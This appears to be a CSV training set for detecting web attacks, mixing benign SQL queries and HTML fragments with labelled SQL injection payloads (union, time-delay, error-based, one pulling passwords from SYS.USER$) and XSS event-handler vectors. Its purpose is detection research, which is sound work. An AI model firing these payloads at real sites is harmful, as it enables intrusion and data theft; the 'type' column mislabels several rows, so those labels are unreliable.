Text,Label,type
"<image onkeyup=""alert(1)"" contenteditable>test</image>",2,xss
SELECT outline FROM worker UNION ALL SELECT start FROM soap ORDER BY dot,0,sql
"<li class=""toclevel-2 tocsection-24""><a href=""#Statistical_learning""><span class=""tocnumber"">5.4 ",0,xss
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1,sql
intxaurraga,0,xss
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",1,sql
hays_adiarte@lingotes.com.je,0,xss
es3an7oso,0,sql
"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1,sql
san miguel del pino,0,sql
SELECT * FROM type,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,sql
 </p>,0,xss
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1,xss
<canvas id=x tabindex=1 onactivate=alert(1)></canvas>,2,xss
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1,sql
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,2,xss
-5970' where 2769  =  2769 union all select 2769--,1,xss
<element id=x tabindex=1 onbeforeactivate=alert(1)></element>,2,xss
"1,iif  (  6333  =  1227,1,1/0  )  ",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_options_twitter_url' LIMIT 1,0,sql
SELECT AVG ( prevent )  FROM becoming  SELECT SUM ( listen ) ,0,sql
"<kbd onmouseenter=""alert(1)"">test</kbd>",2,xss
</div>,0,xss
SELECT * FROM saved FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"<li><a href=""/wiki/Carl_Gustav_Hempel"" title=""Carl Gustav Hempel"">Carl Gustav Hempel </a> </li>",0,xss
select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,1,xss
"  SELECT mileID AS ID, limited AS come FROM wish",0,xss
"   SELECT Employees.below, COUNT ( Orders.entirelyID )  AS fifteenFROM    ( OrdersINNER JOIN foreign ON Orders.towardID  =  Employees.temperatureID ) ",0,xss
"<li id=""cite_note-guardian_jobs_debate-24""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-guardian_jobs_debate_24-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-guardian_jobs_debate_24-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
atuesta venturi,0,sql
SELECT * FROM effort WHERE scared = 'these',0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=8"" title=""Edit section: Learning"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT becoming ( s )  FROM terrible UNION,0,xss
SELECT * FROM goose WHERE mistake BETWEEN judge09/01/1996twelve AND within15/31/1996plain,0,sql
"  SELECT RIGHT ( ""SQL Tutorial is cool"", 4 )  AS ExtractString;",0,sql
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
SELECT manufacturing ( s )  FROM nearest LEFT JOIN,0,sql
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",2,xss
"-8875""  )   where 8428  =  8428 or 1519  =  5756--",1,sql
 UPDATE rain SET correctly = 'deal'WHERE dry = 'herself',0,sql
SELECT religious FROM vegetable UNION ALL SELECT again FROM paper ORDER BY dark,0,xss
"<style>@keyframes x{}</style><summary style=""animation-name:x"" onanimationstart=""alert(1)""></summary>",2,xss
revuelta borgua,0,sql
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>,2,xss
"   SELECT engineer, shown, scientist FROM physical WHERE exclaimed  IS NULL",0,xss
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 10.3, 17.5 </li> </ul>",0,xss
"<a href=""/wiki/Markov_decision_process"" title=""Markov decision process"">Markov decision processes </a> and dynamic <a href=""/wiki/Decision_network"" class=""mw-redirect"" title=""Decision network"">decision networks </a>:",0,xss
8937,0,sql
miera,0,sql
"        &copy; Copyright 2008–2020, Scrapy developers",0,xss
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"estao, 92 4?c",0,sql
"<li><cite id=""CITEREFHawkinsBlakeslee2005"" class=""citation book""><a href=""/wiki/Jeff_Hawkins"" title=""Jeff Hawkins"">Hawkins, Jeff </a>; Blakeslee, Sandra (2005). <a href=""/wiki/On_Intelligence"" title=""On Intelligence""><i>On Intelligence </i> </a>. New York, NY: Owl Books. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-8050-7853-4"" title=""Special:BookSources/978-0-8050-7853-4""><bdi>978-0-8050-7853-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=On+Intelligence&amp;rft.place=New+York%2C+NY&amp;rft.pub=Owl+Books&amp;rft.date=2005&amp;rft.isbn=978-0-8050-7853-4&amp;rft.aulast=Hawkins&amp;rft.aufirst=Jeff&amp;rft.au=Blakeslee%2C+Sandra&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM difficult  WHERE question = torn,0,sql
SELECT warm ( s )  FROM animal UNION,0,sql
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1,sql
1'||  (  select 'ozoj' where 1608  =  1608,1,sql
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""zzca""  =  ""zzca",1,xss
18726543n,0,sql
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",2,xss
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<area onkeyup=""alert(1)"" contenteditable>test</area>",2,xss
javascript:alert(''),2,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></marquee>",2,xss
"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,sql
"<li><a href=""#CITEREFMoravec1988"">Moravec 1988 </a>, p.&#160;13, </li>",0,xss
	 </span> </a> </i>&#93; </sup> </li> </ul>,0,xss
"INSERT INTO watch  ( help, gas, excellent )  VALUES  ( 'among', 'than', 'skill' )  ",0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,xss
DELETE FROM cloud WHERE young = 'country',0,sql
SELECT COUNT ( correct ) FROM form,0,sql
 UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph',0,sql
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'esma' like 'esma",1,sql
"1"" where 1537  =  1537 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
25793872q,0,sql
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,sql
"com/?option  =  com_k2  <act>  <![CDATA[procMemberInsert]]>  </act>   <act>  <![CDATA[procMemberLogin]]>  </act>   <allow_comment>  <![CDATA[]]>  </allow_comment>   <allow_trackback>  <![CDATA[]]>  </allow_trackback>   <birthday>  <![CDATA[19850616]]>  </birthday>   <content>  <![CDATA[ <img src  =  ""http://media2",0,sql
SELECT * FROM pan WHERE occasionally BETWEEN '1996-07-01' AND '1996-07-31',0,xss
SELECT * FROM Customers  WHERE CustomerName NOT LIKE 'a%';,0,xss
SELECT * FROM next FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/overview.html"">Scrapy at a glance</a></li>",0,xss
SELECT enter ( s )  FROM funny LEFT JOIN,0,sql
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",1,sql
ibdes,0,sql
SELECT TOP 3 * FROM moon,0,sql
SELECT * FROM without WHERE managed = 'higher'  OR stick = 'biggest',0,sql
SELECT bell ( s )  FROM main,0,sql
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country  =  ""Brazil"";",0,sql
"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
SELECT * FROM  ( SELECT harder FROM hole ) ,0,xss
SELECT COUNT ( symbol ) FROM planned,0,xss
"1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<td onbeforepaste=""alert(1)"" contenteditable>test</td>",2,xss
" </p><p><a href=""/wiki/Edward_Fredkin"" title=""Edward Fredkin"">Edward Fredkin </a> argues that ""artificial intelligence is the next stage in evolution"", an idea first proposed by <a href=""/wiki/Samuel_Butler_(novelist)"" title=""Samuel Butler (novelist)"">Samuel Butler </a>'s ""<a href=""/wiki/Darwin_among_the_Machines"" title=""Darwin among the Machines"">Darwin among the Machines </a>"" as far back as 1863, and expanded upon by <a href=""/wiki/George_Dyson_(science_historian)"" title=""George Dyson (science historian)"">George Dyson </a> in his book of the same name in 1998.<sup id=""cite_ref-AI_as_evolution_412-0"" class=""reference""><a href=""#cite_note-AI_as_evolution-412"">&#91;400&#93; </a> </sup>",0,xss
SELECT DISTINCT Country FROM Customers;,0,sql
select   (  case when   (  1812  =  2446  )   then 1812 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"<li><a href=""/wiki/Social_software"" title=""Social software"">Social information systems </a> </li>",0,xss
48707568p,0,sql
<details ontoggle=alert(1) open>test</details>,2,xss
SELECT suppose ( s ) FROM rose INNER JOIN,0,sql
<map onpointerleave=alert(1)>XSS</map>,2,xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",2,xss
SELECT AVG ( harbor ) FROM sad SELECT SUM ( question ) ,0,xss
"<li><a href=""/wiki/Martin_Rees"" title=""Martin Rees"">Martin Rees </a> </li>",0,xss
SELECT AVG ( decide ) FROM recently SELECT SUM ( classroom ) ,0,sql
"  <script type=""text/javascript"">",0,xss
1' and non_existant_table   =   '1,1,sql
SELECT column_name FROM table_name WHERE column_name operator ALL,0,xss
"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
"1""  )   union all select null,null#",1,sql
SELECT these FROM change,0,sql
"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1,sql
85amo,0,sql
"<q onmouseover=""alert(1)"">test</q>",2,xss
SELECT * FROM principle,0,sql
"  SELECT supply AS prepare, layers AS [line]  FROM belt",0,xss
"<a onmousedown=""alert(1)"">test</a>",2,xss
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",2,xss
1'+  (  select 'vidl' where 9445  =  9445 and 5498  =  5777#,1,xss
1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',1,sql
1   )    )    as xyuy where 6894  =  6894,1,sql
"<small onmouseenter=""alert(1)"">test</small>",2,xss
SELECT laid ( s )  FROM clearly UNION,0,sql
SELECT TOP 3 * FROM forgotten WHERE coast = 'boy' SELECT * FROM gently,0,xss
-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Jozefowicz, Rafal; Vinyals, Oriol; Schuster, Mike; Shazeer, Noam; Wu, Yonghui (2016). ""Exploring the Limits of Language Modeling"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1602.02410"">1602.02410 </a> ",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4982 )  ORDER BY meta_id ASC",0,xss
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",2,xss
"<noframes onkeypress=""alert(1)"" contenteditable>test</noframes>",2,xss
<head id=x tabindex=1 onactivate=alert(1)></head>,2,xss
-3107'  )   where 7782  =  7782 or 8571  =  8571--,1,sql
"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,1,sql
5316,0,sql
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,sql
1632,0,sql
3200,0,sql
" SELECT * FROM sold ORDER BY should ASC, simple DESC",0,sql
22416,0,sql
"<details draggable=""true"" ondrag=""alert(1)"">test</details>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
1 where 9620  =  9620 waitfor delay '0:0:5'--,1,xss
" SELECT column_name ( s )  FROM task,wolf",0,sql
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0,sql
"<style>@keyframes x{}</style><menu style=""animation-name:x"" onanimationend=""alert(1)""></menu>",2,xss
"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<nextid onkeydown=""alert(1)"" contenteditable>test</nextid>",2,xss
gracomda7,0,sql
1'  )   where 8118  =  8118,1,sql
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",2,xss
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",2,xss
SELECT stomach ( s )  FROM attached SELECT supply ( s ) ,0,xss
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",1,sql
"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1,sql
"1"" where 1234  =  1234",1,sql
seniuk,0,sql
SELECT * FROM joined 3,0,xss
monturi,0,sql
SELECT TOP 50 PERCENT * FROM yesterday,0,sql
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'iwmy'  =  'iwmy,1,sql
SELECT * FROM may WHERE    NOT find = 'plain',0,sql
SELECT stiff ( s )  FROM tried LEFT JOIN,0,sql
SELECT * FROM clay FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<pre onpointerenter=alert(1)>XSS</pre>,2,xss
"	 <div id=""toc"" class=""toc"" role=""navigation"" aria-labelledby=""mw-toc-heading""><input type=""checkbox"" role=""button"" id=""toctogglecheckbox"" class=""toctogglecheckbox"" style=""display:none"" />",0,xss
"<shadow onclick=""alert(1)"">test</shadow>",2,xss
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",2,xss
"<li><a href=""/wiki/Epiphenomenalism"" title=""Epiphenomenalism"">Epiphenomenalism </a> </li>",0,xss
SELECT * FROM wp_posts WHERE ID  =  347696 LIMIT 1,0,sql
5856,0,sql
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,2,xss
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,sql
"			<input type=""search"" name=""search"" placeholder=""Search Wikipedia"" title=""Search Wikipedia [f]"" accesskey=""f"" id=""searchInput""/>",0,xss
cadaqus,0,xss
SELECT * FROM anyway WHERE master = 'title',0,sql
SELECT * FROM case  WHERE finest NOT LIKE '[location]%',0,sql
c/ dos de mayo 89 13?b,0,sql
SELECT air ( s )  FROM traffic,0,sql
SELECT COUNT ( DISTINCT command )  FROM return,0,sql
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,2,xss
SELECT TOP 3 * FROM breeze SELECT * FROM attached 3SELECT * FROM additional,0,sql
"<dt onmouseup=""alert(1)"">test</dt>",2,xss
"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL",0,sql
"INSERT INTO `wp_options`  ( `option_name`, `option_value`, `autoload` )  VALUES  ( '_transient_doing_cron', '1630907689.8412559032440185546875', 'yes' )  ON DUPLICATE KEY UPDATE `option_name`  =  VALUES ( `option_name` ) , `option_value`  =  VALUES ( `option_value` ) , `autoload`  =  VALUES ( `autoload` ) ",0,sql
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_5-63""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_5_63-0"">^ </a> </b> ",0,xss
"<table onbeforecut=""alert(1)"" contenteditable>test</table>",2,xss
SELECT * FROM lamp,0,sql
en9r195d9,0,sql
	 </span> </li>,0,xss
Expert systems:,0,xss
"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'kufi'  =  'kufi",1,xss
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",1,sql
"INSERT INTO mine  ( yourself, shelf, rest )  VALUES  ( 'melted', 'area', 'forgotten' )  ",0,sql
kriz,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fusion.net&amp;rft.atitle=The+case+against+killer+robots%2C+from+a+guy+actually+working+on+artificial+intelligence&amp;rft_id=http%3A%2F%2Ffusion.net%2Fstory%2F54583%2Fthe-case-against-killer-robots-from-a-guy-actually-building-ai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
